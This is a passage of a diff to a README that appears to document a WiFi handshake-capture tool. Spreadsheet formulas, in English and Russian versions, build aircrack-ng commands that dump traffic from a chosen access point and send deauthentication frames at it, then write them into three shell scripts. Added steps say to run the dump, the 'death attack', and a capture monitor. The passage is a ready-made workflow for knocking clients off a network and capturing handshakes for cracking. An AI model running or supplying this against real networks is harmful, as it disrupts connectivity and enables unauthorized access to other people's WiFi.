@@ -49,18 +49,27 @@ wpaclean out.cap in.cap
 
 ```sh
 x	dump	death	clean
-=VLOOKUP(A3,F:F,1,FALSE)	=CONCATENATE("airodump-ng --bssid ",A3," "," --channel ",D3," "," wlan0 -w ",N3)	=CONCATENATE("aireplay-ng --deauth 10 -a ",A3," ","wlan0")	=CONCATENATE("watch -n 1 wpaclean clean_",N3,".cap ",N3,"-01.cap")
+=VLOOKUP(A3,F:F,1,FALSE) 	=CONCATENATE("airodump-ng --bssid ",A3," "," --channel ",D3," "," wlan0 -w ",N3) 	=CONCATENATE("aireplay-ng --deauth 10 -a ",A3," ","wlan0") 	=CONCATENATE("watch -n 1 wpaclean clean_",N3,".cap ",N3,"-01.cap") 	=CONCATENATE("echo airodump-ng --bssid ",A3," --channel ",D3," wlan0 -w ",N3," > 1.sh && echo aireplay-ng --deauth 10 -a ",A3," wlan0 > 2.sh && echo watch -n 1 wpaclean clean_",N3,".cap ",N3,"-01.cap > 3.sh && chmod +x *.sh")
 ```
 ```sh
 x	dump	death	clean	sh
 =ВПР(A3;F:F;1;ЛОЖЬ) 	=СЦЕПИТЬ("airodump-ng --bssid ";A3;" ";" --channel ";D3;" ";" wlan0 -w ";N3) 	=СЦЕПИТЬ("aireplay-ng --deauth 10 -a ";A3;" ";"wlan0") 	=СЦЕПИТЬ("watch -n 1 wpaclean clean_";N3;".cap ";N3;"-01.cap")	=СЦЕПИТЬ("echo airodump-ng --bssid ";A3;" --channel ";D3;" wlan0 -w ";N3;" > 1.sh && echo aireplay-ng --deauth 10 -a ";A3;" wlan0 > 2.sh && echo watch -n 1 wpaclean clean_";N3;".cap ";N3;"-01.cap > 3.sh && chmod +x *.sh")
 
 ```
+
+#### You get 1.sh,2.sh,3.sh files
+	1 - run Dumping
+	2 - run Deahth Attack 
+	3 - Monitoring clean package, if get then attack OK
+
 ### Reset wifi adapter to managed mode
 ```bash
 sudo ip link set wlan0 down && sudo iw dev wlan0 set type managed && sudo ip link set wlan0 up && systemctl start NetworkManager
 ```
 
+
+
+# Optional functionalyty:
 
 ### Wi-Fi Dumping (wifi_dump.sh)
 
